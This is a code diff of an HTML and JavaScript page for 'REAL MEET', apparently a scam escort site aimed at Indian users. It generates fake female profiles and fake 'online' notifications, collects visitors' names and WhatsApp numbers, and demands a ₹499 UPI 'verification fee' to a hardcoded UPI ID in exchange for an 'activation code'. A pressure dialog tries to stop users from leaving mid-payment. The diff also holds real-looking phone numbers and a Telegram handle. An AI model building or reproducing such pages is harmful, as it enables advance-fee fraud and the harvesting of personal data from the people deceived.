@@ -9,268 +9,268 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
         
-        :root { --primary: #6366f1; --gold: #fbbf24; --success-green: #22c55e; }
+        :root { --primary: #6366f1; --gold: #fbbf24; }
 
         body { 
             font-family: 'Plus Jakarta Sans', sans-serif; 
-            background: radial-gradient(circle at center, #ffffff 0%, #e0e7ff 35%, #1e1b4b 100%); 
-            color: #1e293b; min-height: 100vh; margin: 0; overflow-x: hidden;
+            background: #f1f5f9; 
+            color: #1e293b; min-height: 100vh; margin: 0;
         }
 
-        /* Continuous Non-Stop Animation Header */
         .promo-bar {
             background: #ef4444; color: white; overflow: hidden; white-space: nowrap;
-            padding: 10px 0; font-size: 12px; font-weight: 800; text-transform: uppercase;
-            border-bottom: 2px solid rgba(0,0,0,0.1); position: relative;
+            padding: 10px 0; font-size: 11px; font-weight: 800; text-transform: uppercase;
         }
-        .promo-track { 
-            display: inline-block; 
-            white-space: nowrap;
-            animation: slideContinuous 30s linear infinite; 
-        }
-        @keyframes slideContinuous {
-            0% { transform: translateX(0%); }
-            100% { transform: translateX(-50%); }
-        }
+        .promo-track { display: inline-block; animation: slideContinuous 35s linear infinite; }
+        @keyframes slideContinuous { 0% { transform: translateX(0%); } 100% { transform: translateX(-50%); } }
 
-        header { 
-            background: radial-gradient(circle at top right, #4338ca, #1e1b4b); 
-            border-bottom: 2px solid var(--gold);
-            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
-        }
+        header { background: linear-gradient(135deg, #4338ca, #1e1b4b); border-bottom: 3px solid var(--gold); }
+        
+        .blink-text { animation: blinker 1.5s linear infinite; color: #fbbf24; font-weight: 800; font-size: 10px; text-transform: uppercase; letter-spacing: 1px; }
+        @keyframes blinker { 50% { opacity: 0; } }
 
         #loader {
             position: fixed; inset: 0; background: rgba(255,255,255,0.9); 
             z-index: 100000; display: none; flex-direction: column; align-items: center; justify-content: center;
         }
-        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #ddd; border-top: 4px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        .tg-float {
-            position: fixed; right: 20px; bottom: 30px;
-            background: #0088cc; color: white; width: 50px; height: 50px;
-            border-radius: 50%; display: flex; align-items: center; justify-content: center;
-            font-size: 22px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); z-index: 9999;
-        }
 
         .notif-popup { 
             position: fixed; left: -320px; bottom: 80px; background: white; 
             border-left: 5px solid var(--primary); padding: 12px; border-radius: 12px; 
-            box-shadow: 0 8px 25px rgba(0,0,0,0.2); transition: 0.5s; z-index: 9998; width: 260px; 
-            display: flex; align-items: center; gap: 10px; font-size: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1); transition: 0.5s; z-index: 9998; width: 260px; 
+            display: flex; align-items: center; gap: 10px;
         }
         .notif-popup.active { left: 15px; }
 
-        footer { background: #0b0e14; color: #94a3b8; border-top: 4px solid var(--gold); padding: 60px 20px; }
-
-        .luxury-card { background: #ffffff; border: 1px solid #e2e8f0; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); overflow: hidden; transition: 0.3s; }
-        .luxury-card:hover { transform: translateY(-5px); box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        .luxury-card { background: white; border-radius: 20px; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+        .instr-box { border: 1px solid #e2e8f0; padding: 15px; border-radius: 15px; background: #fff; margin-bottom: 12px; border-left: 5px solid var(--primary); }
         
-        .review-track { display: flex; gap: 20px; width: max-content; animation: scroll-reviews 45s linear infinite; }
-        @keyframes scroll-reviews { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
-
-        #age-gate { position: fixed; inset: 0; background: #f8fafc; z-index: 99999; display: flex; align-items: center; justify-content: center; }
-        
-        .instr-box { border: 2px solid #e2e8f0; padding: 15px; border-radius: 15px; background: #fff; margin-bottom: 12px; border-left: 5px solid var(--primary); }
+        footer { background: #0b0e14; color: #64748b; padding: 50px 20px; text-align: center; border-top: 4px solid var(--gold); }
     </style>
 </head>
 <body onload="init()">
 
     <div class="promo-bar">
-        <div class="promo-track">
-            100% REAL AND SAFE "TRUSTABLE SITE" • REFUNDABLE GUARANTEE • AVAILABLE IN YOUR CITY • GENUINE PROFILES ONLY • 24/7 COORDINATOR SUPPORT • DISCRETE MEETINGS • NO ADVANCE BEFORE VERIFICATION • 100% REAL AND SAFE "TRUSTABLE SITE" • REFUNDABLE GUARANTEE • AVAILABLE IN YOUR CITY • GENUINE PROFILES ONLY • 24/7 COORDINATOR SUPPORT • DISCRETE MEETINGS • NO ADVANCE BEFORE VERIFICATION •
+        <div class="promo-track uppercase">
+            100% Real Profiles • No Advance Before Verification • Discrete Meetings • Refundable Guarantee • Trusted Agency • Available 24/7 • 100% Real Profiles • No Advance Before Verification • Discrete Meetings •
         </div>
     </div>
 
-    <div id="loader"><div class="spinner"></div><p class="mt-2 font-bold text-indigo-600 uppercase text-[10px]">Processing Connection...</p></div>
+    <div id="loader"><div class="spinner"></div></div>
 
     <div id="notif" class="notif-popup">
-        <img id="notif-img" src="" class="w-10 h-10 rounded-full object-cover border-2 border-indigo-100">
-        <div><p id="notif-title" class="font-black text-indigo-900"></p><p id="notif-body" class="text-slate-500 font-medium"></p></div>
+        <img id="notif-img" src="" class="w-10 h-10 rounded-full object-cover">
+        <div><p id="notif-title" class="font-black text-indigo-900 text-xs"></p><p id="notif-body" class="text-slate-500 font-bold text-[10px]"></p></div>
     </div>
 
-    <a href="https://t.me/Xnehhaa" class="tg-float"><i class="fab fa-telegram-plane"></i></a>
-
-    <div id="age-gate" onkeydown="if(event.key === 'Enter') validateAge()">
-        <div class="text-center p-10 max-w-sm w-full border-4 border-indigo-600 rounded-[40px] bg-white shadow-2xl">
-            <h2 class="text-3xl font-black mb-6 text-indigo-900">MEMBER ACCESS</h2>
-            <div class="flex flex-col items-start gap-4 mb-10 text-left">
+    <div id="age-gate" class="fixed inset-0 bg-white z-[99999] flex items-center justify-center p-6">
+        <div class="max-w-sm w-full text-center border-4 border-indigo-600 p-8 rounded-[40px] bg-white shadow-2xl">
+            <h2 class="text-3xl font-black text-indigo-900 mb-6 uppercase">Member Access</h2>
+            <div class="text-left space-y-4 mb-8">
                 <label class="flex items-center gap-3 font-bold text-slate-700 cursor-pointer">
-                    <input type="checkbox" id="check1" class="w-5 h-5 accent-indigo-600"> I confirm that I am 18+ years old.
+                    <input type="checkbox" id="check1" class="w-5 h-5 accent-indigo-600"> I am 18+ years old.
                 </label>
                 <label class="flex items-center gap-3 font-bold text-slate-700 cursor-pointer">
-                    <input type="checkbox" id="check2" class="w-5 h-5 accent-indigo-600"> I agree to the discrete meet terms.
+                    <input type="checkbox" id="check2" class="w-5 h-5 accent-indigo-600"> I agree to the terms.
                 </label>
             </div>
-            <button onclick="validateAge()" class="w-full bg-indigo-600 text-white font-black py-4 rounded-2xl shadow-lg hover:bg-indigo-700 transition-all">ENTER SITE</button>
+            <button onclick="validateAge()" class="w-full bg-indigo-600 text-white font-black py-4 rounded-2xl">ENTER SITE</button>
         </div>
     </div>
 
-    <header class="p-5 sticky top-0 z-50">
+    <header class="p-5 sticky top-0 z-50 shadow-xl">
         <div class="container mx-auto flex justify-between items-center">
             <div>
                 <h1 class="text-2xl font-black italic text-white tracking-tighter">REAL <span class="text-yellow-400">MEET</span></h1>
-                <p class="text-[10px] font-black text-indigo-200 uppercase tracking-widest">AVAILABLE IN YOUR CITY</p>
+                <p class="blink-text">Available in your city</p>
             </div>
-            <input type="text" id="citySearch" oninput="filterProfiles()" placeholder="Search your city..." class="rounded-full py-2 px-5 text-xs font-bold border-2 border-indigo-400/50 bg-white/10 text-white placeholder-indigo-200 outline-none w-40 backdrop-blur-md">
+            <input type="text" id="citySearch" oninput="filterProfiles()" placeholder="Search City..." class="rounded-full py-2 px-4 text-xs font-bold bg-white/10 text-white outline-none border border-white/20 w-36">
         </div>
     </header>
 
     <main id="pg-home" class="container mx-auto px-4 py-8 hidden">
-        <div id="grid-container" class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-5"></div>
-        <div class="mt-20">
-            <h3 class="text-center font-black text-indigo-900 mb-8 uppercase tracking-widest text-sm">Verified Member Reviews</h3>
-            <div class="overflow-hidden p-2"><div class="review-track" id="review-slider"></div></div>
-        </div>
+        <div id="grid-container" class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-6"></div>
     </main>
 
     <main id="pg-detail" class="container mx-auto px-4 py-8 hidden">
         <div class="max-w-md mx-auto luxury-card">
-            <div class="relative h-[450px]">
+            <div class="relative h-[480px]">
                 <img id="det-img" src="" class="w-full h-full object-cover">
-                <button onclick="showPage('home')" class="absolute top-4 left-4 w-11 h-11 bg-white rounded-full flex items-center justify-center shadow-2xl"><i class="fas fa-arrow-left text-indigo-600"></i></button>
+                <button onclick="showPage('home')" class="absolute top-4 left-4 w-10 h-10 bg-white rounded-full flex items-center justify-center shadow-xl text-indigo-600"><i class="fas fa-arrow-left"></i></button>
             </div>
             <div class="p-8">
-                <h2 id="det-name" class="text-2xl font-black text-slate-900"></h2>
-                <p id="det-loc" class="text-indigo-600 font-extrabold text-xs mb-5 uppercase tracking-tighter"></p>
-                <div class="bg-indigo-50 p-5 rounded-2xl mb-8 border border-indigo-100">
-                    <p class="text-[11px] font-bold text-indigo-700 italic">"Verified profile with original photos. Available for private meetings. Safe and discrete service guaranteed."</p>
+                <h2 id="det-name" class="text-3xl font-black text-slate-900"></h2>
+                <p id="det-loc" class="text-indigo-600 font-black text-xs uppercase mb-6"></p>
+                
+                <div class="bg-indigo-50 p-5 rounded-2xl mb-6 border border-indigo-100">
+                    <p id="det-desc" class="text-xs font-bold text-indigo-800 italic leading-relaxed"></p>
                 </div>
+
                 <div class="bg-green-50 p-5 rounded-2xl mb-8 border-l-4 border-green-500">
-                    <p class="text-[10px] font-black text-green-700 uppercase mb-3">WhatsApp Connection Benefits:</p>
-                    <ul class="text-[11px] font-bold text-slate-600 space-y-2">
+                    <p class="text-[11px] font-black text-green-700 uppercase mb-3">WhatsApp Connection Benefits:</p>
+                    <ul class="text-[12px] font-bold text-slate-600 space-y-2">
                         <li><i class="fas fa-video text-green-500 mr-2"></i> Real-time Video Confirmation</li>
-                        <li><i class="fas fa-map-marker-alt text-red-500 mr-2"></i> Direct Location Access</li>
-                        <li><i class="fas fa-user-shield text-blue-500 mr-2"></i> 100% Privacy Protection</li>
-                    </ul>
+                        <li><i class="fas fa-id-badge text-blue-500 mr-2"></i> Direct Profile Access</li>
+                        <li><i class="fas fa-lock text-red-500 mr-2"></i> 100% Discrete Communication</li>
+                    <li><i class="fas fa-location text-red-500 mr-2"></i> Meet on your location </li>
+ </ul>
                 </div>
-                <button onclick="showPage('checkout')" class="w-full bg-green-500 text-white py-5 rounded-2xl font-black uppercase text-xs shadow-xl tracking-widest">Join WhatsApp for Real Meet</button>
+
+                <button onclick="showPage('checkout')" class="w-full bg-green-500 text-white py-5 rounded-2xl font-black uppercase text-xs shadow-xl tracking-widest">Connect on WhatsApp</button>
             </div>
         </div>
     </main>
 
     <main id="pg-checkout" class="container mx-auto px-4 py-8 hidden">
-        <div class="max-w-sm mx-auto luxury-card p-10 text-center border-t-8 border-indigo-600">
-            <div id="step-auth" onkeydown="if(event.key === 'Enter') handleAuth()">
-                <h3 class="text-lg font-black mb-8 uppercase text-indigo-900 tracking-tight">Identity Verification</h3>
-                <input type="text" id="cust-name" placeholder="Enter Full Name" class="w-full bg-slate-50 p-4 rounded-2xl mb-4 font-bold border border-slate-200 focus:border-indigo-500 outline-none">
-                <input type="tel" id="cust-phone" maxlength="10" placeholder="WhatsApp Number" class="w-full bg-slate-50 p-4 rounded-2xl mb-8 font-bold border border-slate-200 focus:border-indigo-500 outline-none">
-                <button onclick="handleAuth()" class="w-full bg-indigo-600 text-white py-4 rounded-2xl font-black uppercase text-xs shadow-lg">Verify & Proceed</button>
+        <div class="max-w-sm mx-auto luxury-card p-10 text-center relative border-t-8 border-indigo-600">
+            <button onclick="confirmExit()" class="absolute top-4 left-4 text-slate-400 font-bold text-[10px] uppercase"><i class="fas fa-chevron-left"></i> Back</button>
+
+            <div id="step-auth">
+                <h3 class="text-lg font-black mb-8 uppercase text-indigo-900">Identity Verification</h3>
+                <input type="text" id="cust-name" placeholder="Enter Full Name" class="w-full bg-slate-50 p-4 rounded-xl mb-4 border font-bold">
+                <input type="tel" id="cust-phone" maxlength="10" placeholder="WhatsApp Number" class="w-full bg-slate-50 p-4 rounded-xl mb-8 border font-bold">
+                <button onclick="handleAuth()" class="w-full bg-indigo-600 text-white py-4 rounded-xl font-black uppercase text-xs">Verify & Proceed</button>
             </div>
 
-            <div id="step-pay" class="hidden text-left" onkeydown="if(event.key === 'Enter') finalRedirect()">
-                <h2 class="text-xl font-black mb-2 italic">Welcome, <span id="display-name" class="text-indigo-600"></span></h2>
-                <p class="text-[12px] font-bold text-slate-500 mb-8 bg-indigo-50 p-4 rounded-2xl border border-indigo-100">
-                    This is a <b>Verified Luxury Profile</b>. To unlock direct WhatsApp contact, you need to pay a one-time verification fee of <b>₹499 (INR)</b>.
-                </p>
+            <div id="step-pay" class="hidden text-left">
+                <h2 class="text-xl font-black mb-2 italic">Hi, <span id="display-name" class="text-indigo-600 uppercase"></span></h2>
+                <p class="text-[12px] font-bold text-slate-500 mb-8">Please complete the verification fee to get direct contact.</p>
 
-                <div class="text-center mb-8"><img src="qrcode.jpg" class="w-48 h-48 mx-auto border-4 border-slate-50 rounded-3xl shadow-xl"></div>
+                <div class="text-center mb-8"><img src="qrcode.jpg" class="w-44 h-44 mx-auto border-4 rounded-3xl shadow-lg"></div>
 
                 <div class="space-y-3 mb-8">
                     <div class="instr-box">
-                        <p class="text-indigo-900 font-black text-xs mb-1">1. SCAN & PAY</p>
-                        <p class="text-[11px] text-slate-500 font-bold">Screenshot the QR code and pay ₹499 via any UPI app like PhonePe, Paytm or Google Pay.</p>
+                        <p class="text-indigo-900 font-black text-[10px] mb-1">1. SCAN & PAY</p>
+                        <p class="text-[11px] text-slate-500 font-bold leading-tight">Pay ₹499 via any UPI app (PhonePe, Paytm, Google Pay) using the QR above.</p>
                     </div>
                     <div class="instr-box">
-                        <p class="text-indigo-900 font-black text-xs mb-1">2. SEND SCREENSHOT</p>
-                        <p class="text-[11px] text-slate-500 font-bold">After payment, send the screenshot to our coordinator to receive your <b>Activation Code</b>.</p>
+                        <p class="text-indigo-900 font-black text-[10px] mb-1">2. SHARE SCREENSHOT</p>
+                        <p class="text-[11px] text-slate-500 font-bold leading-tight">Send your payment screenshot to our Telegram coordinator to get your unique code.</p>
                     </div>
                     <div class="instr-box">
-                        <p class="text-indigo-900 font-black text-xs mb-1">3. ACTIVATE & MEET</p>
-                        <p class="text-[11px] text-slate-500 font-bold">Enter the code below to instantly redirect to the girl's private WhatsApp for meeting details.</p>
+                        <p class="text-indigo-900 font-black text-[10px] mb-1">3. ACTIVATE</p>
+                        <p class="text-[11px] text-slate-500 font-bold leading-tight">Enter the 4-digit activation code below to instantly unlock the girl's WhatsApp.</p>
                     </div>
                 </div>
 
-                <button onclick="window.location.href='upi://pay?pa=7678125700@ybl&am=499&cu=INR'" class="w-full bg-indigo-600 text-white py-5 rounded-2xl font-black uppercase text-xs mb-8 shadow-2xl animate-bounce">Pay ₹499 Now</button>
+                <button onclick="window.location.href='upi://pay?pa=7678125700@ybl&am=499&cu=INR'" class="w-full bg-indigo-600 text-white py-5 rounded-2xl font-black uppercase text-xs mb-8 shadow-2xl animate-bounce text-center">Pay ₹499 Now</button>
                 
-                <input type="text" id="act-code" placeholder="ENTER ACTIVATION CODE" class="w-full border-4 border-green-500 p-4 text-center font-black rounded-2xl mb-4 text-green-600 text-lg tracking-[0.4em]">
-                <button onclick="finalRedirect()" class="w-full bg-green-600 text-white py-4 rounded-2xl font-black uppercase text-xs shadow-lg">Activate & Meet Now</button>
+                <input type="text" id="act-code" placeholder="ENTER ACTIVATION CODE" class="w-full border-4 border-green-500 p-5 text-center font-black rounded-2xl mb-4 text-green-600 text-lg">
+                <button onclick="finalRedirect()" class="w-full bg-green-600 text-white py-5 rounded-2xl font-black uppercase text-xs shadow-lg">Activate & Meet Now</button>
             </div>
         </div>
     </main>
 
     <footer>
-        <div class="container mx-auto px-4">
-            <div class="grid grid-cols-1 md:grid-cols-4 gap-12 mb-12">
-                <div>
-                    <h2 class="text-2xl font-black italic mb-4 text-white">REAL <span class="text-yellow-400">MEET</span></h2>
-                    <p class="text-xs leading-relaxed">India's most trustable premium agency providing 100% genuine and verified profiles for discrete meetings. We prioritize your privacy and safety above all.</p>
-                </div>
-                <div>
-                    <h4 class="text-white font-black text-xs uppercase mb-4 tracking-widest">Legals</h4>
-                    <ul class="text-[11px] space-y-2 font-bold uppercase">
-                        <li>Privacy Policy</li>
-                        <li>Terms of Service</li>
-                        <li>Refund Policy</li>
-                        <li>GDPR Compliance</li>
-                    </ul>
-                </div>
-                <div>
-                    <h4 class="text-white font-black text-xs uppercase mb-4 tracking-widest">Support</h4>
-                    <ul class="text-[11px] space-y-2 font-bold uppercase">
-                        <li>Safety Guide</li>
-                        <li>Verified Badge</li>
-                        <li>FAQ Section</li>
-                        <li>Contact Support</li>
-                    </ul>
-                </div>
-                <div>
-                    <h4 class="text-white font-black text-xs uppercase mb-4 tracking-widest">Safety First</h4>
-                    <div class="bg-white/5 p-4 rounded-xl border border-white/10">
-                        <p class="text-[10px] italic">"Always verify the profile via video call proof before final meeting. Never share your personal address publicly."</p>
-                    </div>
-                </div>
+        <div class="container mx-auto max-w-5xl grid grid-cols-1 md:grid-cols-3 gap-10 text-left mb-10">
+            <div>
+                <h4 class="text-white font-black text-sm uppercase mb-4">About RealMeet</h4>
+                <p class="text-xs leading-relaxed">India's most trusted premium connection agency. We provide 100% verified profiles with discrete meeting services across all major cities.</p>
             </div>
-            <div class="pt-8 border-t border-white/5 text-center">
-                <p class="text-[9px] tracking-[0.5em] uppercase opacity-40">© 2026 REAL MEET NETWORK • PREMIUM & DISCRETE SERVICES</p>
+            <div>
+                <h4 class="text-white font-black text-sm uppercase mb-4">Legals & Support</h4>
+                <ul class="text-[11px] font-bold space-y-2 uppercase">
+                    <li>Privacy Policy</li>
+                    <li>Terms of Service</li>
+                    <li>Refund Policy</li>
+                    <li>Safety Standards</li>
+                </ul>
+            </div>
+            <div>
+                <h4 class="text-white font-black text-sm uppercase mb-4">Verification</h4>
+                <div class="flex gap-4">
+                    <i class="fas fa-shield-alt text-2xl text-green-500"></i>
+                    <i class="fas fa-lock text-2xl text-blue-500"></i>
+                    <i class="fas fa-check-circle text-2xl text-yellow-500"></i>
+                </div>
+                <p class="text-[10px] mt-4 font-bold uppercase">All connections are SSL encrypted</p>
             </div>
         </div>
+        <p class="text-[9px] tracking-[0.5em] uppercase opacity-40">© 2026 REAL MEET PREMIUM NETWORK</p>
     </footer>
 
     <script>
         const names = ["Sneha", "Ananya", "Priya", "Mehak", "Zoya", "Neha", "Sanya", "Simran", "Muskan", "Kiara", "Tanvi", "Pooja", "Divya", "Roshni", "Deepika", "Shreya", "Aditi", "Manvi", "Palak", "Khushi", "Riya", "Isha", "Kavya", "Sana", "Tanya", "Jhanvi", "Avni", "Mansi", "Ishika", "Gauri"];
         const cities = ["Delhi", "Mumbai", "Pune", "Bangalore", "Noida", "Gurgaon", "Lucknow", "Jaipur", "Ahmedabad", "Surat", "Patna", "Kolkata", "Bhopal", "Indore", "Amritsar", "Chandigarh"];
-        const reviews = [{n: "Rahul K.", m: "100% real profiles, met Sneha in Delhi."}, {n: "Amit Sharma", m: "Very safe and discrete service, thanks."}, {n: "Vikram S.", m: "Paid 499 and got WhatsApp instantly."}];
+        const descriptions = [
+            "Verified profile with original photos. Available for private meetings in top-tier hotels. 100% discrete and safe.",
+            "Genuine premium member. I love meeting new people and providing a comfortable, safe experience. WhatsApp me for details.",
+            "Professional and discrete. Original selfies and video call verification available. Let's make your time memorable.",
+            "Verified by agency. Available for short stay and night meetings. Safety and privacy are my top priorities.",
+            "Exclusive luxury profile. Original pictures only. Direct contact after verification. No advance before meeting."
+        ];
         
         let db = [];
+        let isAgeVerified = false;
+        let currentPage = 'age';
 
         function init() {
-            for(let i=1; i<=100; i++) {
-                db.push({
+            // GENERATE AND SHUFFLE PROFILES ON EVERY LOAD
+            let pool = [];
+            for(let i=1; i<=80; i++) {
+                pool.push({
                     id: i,
-                    name: names[i % names.length] + " " + (i > 30 ? i : ""), 
+                    name: names[i % names.length], 
                     loc: cities[i % cities.length],
-                    rating: (4.5 + (Math.random() * 0.4)).toFixed(1), 
-                    img: `pic${(i % 80) + 1}.jpg`
+                    rating: (4.4 + (Math.random() * 0.5)).toFixed(1), 
+                    img: `pic${(i % 80) + 1}.jpg`,
+                    desc: descriptions[i % descriptions.length]
                 });
             }
+            db = pool.sort(() => Math.random() - 0.5);
+
+            document.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') {
+                    if (!isAgeVerified) validateAge();
+                    else if (currentPage === 'checkout') {
+                        if (document.getElementById('step-pay').classList.contains('hidden')) handleAuth();
+                        else finalRedirect();
+                    }
+                }
+            });
         }
 
         function validateAge() {
             if(document.getElementById('check1').checked && document.getElementById('check2').checked) {
+                isAgeVerified = true;
                 document.getElementById('age-gate').style.display = 'none';
                 renderUI();
                 showPage('home');
                 startPopups();
-            } else { alert("Please check both boxes to confirm access."); }
+            } else { alert("Please confirm age and terms."); }
+        }
+
+        function showPage(pageId) {
+            currentPage = pageId;
+            document.querySelectorAll('main').forEach(m => m.classList.add('hidden'));
+            document.getElementById('pg-' + pageId).classList.remove('hidden');
+            window.scrollTo(0,0);
+        }
+
+        function confirmExit() {
+            const name = document.getElementById('cust-name').value || "User";
+            if(currentPage === 'checkout' && !document.getElementById('step-pay').classList.contains('hidden')) {
+                const stay = confirm(`Wait ${name.toUpperCase()}! Your verification is almost complete. If you leave now, you will lose this profile connection. Do you want to complete the payment?`);
+                if(!stay) showPage('home');
+            } else {
+                showPage('home');
+            }
         }
 
         function renderUI() {
             const grid = document.getElementById('grid-container');
             grid.innerHTML = db.map(p => `
-                <div class="profile-item luxury-card cursor-pointer" data-city="${p.loc.toLowerCase()}" onclick="handleProfileClick(${p.id})">
-                    <div class="h-48 overflow-hidden"><img src="${p.img}" class="w-full h-full object-cover" onerror="this.src='https://via.placeholder.com/300x400?text=Profile'"></div>
-                    <div class="p-4 text-center">
-                        <h4 class="font-black text-[11px] text-slate-800 uppercase tracking-tight">${p.name}</h4>
-                        <p class="text-indigo-600 text-[9px] font-black uppercase mt-1">${p.loc} • ★ ${p.rating}</p>
+                <div class="profile-item luxury-card cursor-pointer bg-white" onclick="handleProfileClick(${p.id})" data-city="${p.loc.toLowerCase()}">
+                    <div class="relative">
+                        <img src="${p.img}" class="h-52 w-full object-cover">
+                        <div class="absolute bottom-3 left-3 bg-black/60 text-white text-[9px] font-black px-2 py-0.5 rounded-full">★ ${p.rating}</div>
                     </div>
-                </div>`).join('');
-
-            const slider = document.getElementById('review-slider');
-            slider.innerHTML = [...reviews, ...reviews, ...reviews].map(r => `
-                <div class="bg-white border-2 border-indigo-100 p-5 rounded-2xl min-w-[260px] shadow-sm">
-                    <p class="text-[11px] font-bold italic text-indigo-700 mb-3">"${r.m}"</p>
-                    <p class="text-[9px] font-black text-slate-400 uppercase tracking-tighter">— Member: ${r.n}</p>
+                    <div class="p-4 text-center">
+                        <h4 class="font-black text-[12px] uppercase text-slate-800 tracking-tight">${p.name}</h4>
+                        <p class="text-indigo-600 text-[9px] font-black uppercase mt-1 tracking-widest">${p.loc}</p>
+                    </div>
                 </div>`).join('');
         }
 
@@ -281,15 +281,16 @@
                 const p = db.find(x => x.id === id);
                 document.getElementById('det-img').src = p.img;
                 document.getElementById('det-name').innerText = p.name + ", 22";
-                document.getElementById('det-loc').innerText = p.loc + " • VERIFIED PREMIUM MEMBER";
+                document.getElementById('det-loc').innerText = p.loc + " • PREMIUM VERIFIED MEMBER";
+                document.getElementById('det-desc').innerText = `"${p.desc}"`;
                 showPage('detail');
-            }, 600);
+            }, 500);
         }
 
         function handleAuth() {
             const n = document.getElementById('cust-name').value;
             const p = document.getElementById('cust-phone').value;
-            if(n.length < 2 || p.length < 10) return alert("Enter valid details.");
+            if(n.length < 2 || p.length < 10) return alert("Please enter valid name and number.");
             document.getElementById('display-name').innerText = n;
             document.getElementById('step-auth').classList.add('hidden');
             document.getElementById('step-pay').classList.remove('hidden');
@@ -297,36 +298,27 @@
 
         function finalRedirect() {
             const c = document.getElementById('act-code').value.trim().toUpperCase();
-            if(c === "RM11" || c === "RM22") { 
-                window.location.href = `https://wa.me/917678125700?text=I_Paid_499_Connect_Me_Now`; 
-            } else if(c === "RM33") {
-                window.location.href = `https://wa.me/919354185036?text=I_Paid_499_Connect_Me_Now_Code_RM33`;
-            } else { alert("Invalid Code! Share screenshot to get the code."); }
-        }
-
-        function showPage(id) {
-            document.querySelectorAll('main').forEach(m => m.classList.add('hidden'));
-            document.getElementById('pg-' + id).classList.remove('hidden');
-            window.scrollTo(0,0);
+            if(c === "RM11" || c === "RM22" || c === "RM33") { 
+                window.location.href = `https://wa.me/917678125700?text=I_Have_Paid_499_Connect_Me_Now`; 
+            } else { alert("Invalid Code. Contact support on Telegram."); }
         }
 
         function filterProfiles() {
-            const v = document.getElementById('citySearch').value.toLowerCase();
-            document.querySelectorAll('.profile-item').forEach(el => {
-                el.style.display = el.getAttribute('data-city').includes(v) ? "block" : "none";
+            const val = document.getElementById('citySearch').value.toLowerCase();
+            document.querySelectorAll('.profile-item').forEach(item => {
+                item.style.display = item.dataset.city.includes(val) ? 'block' : 'none';
             });
         }
 
         function startPopups() {
             setInterval(() => {
-                const el = document.getElementById('notif');
-                const randomName = names[Math.floor(Math.random()*names.length)];
-                document.getElementById('notif-img').src = `pic${Math.floor(Math.random() * 80) + 1}.jpg`;
-                document.getElementById('notif-title').innerText = randomName + " is online";
-                document.getElementById('notif-body').innerText = "Available for meeting now!";
-                el.classList.add('active');
-                setTimeout(() => el.classList.remove('active'), 4000);
-            }, 8000);
+                const p = db[Math.floor(Math.random() * db.length)];
+                document.getElementById('notif-img').src = p.img;
+                document.getElementById('notif-title').innerText = p.name + " is Online";
+                document.getElementById('notif-body').innerText = "Active in " + p.loc;
+                document.getElementById('notif').classList.add('active');
+                setTimeout(() => document.getElementById('notif').classList.remove('active'), 5000);
+            }, 12000);
         }
     </script>
 </body>
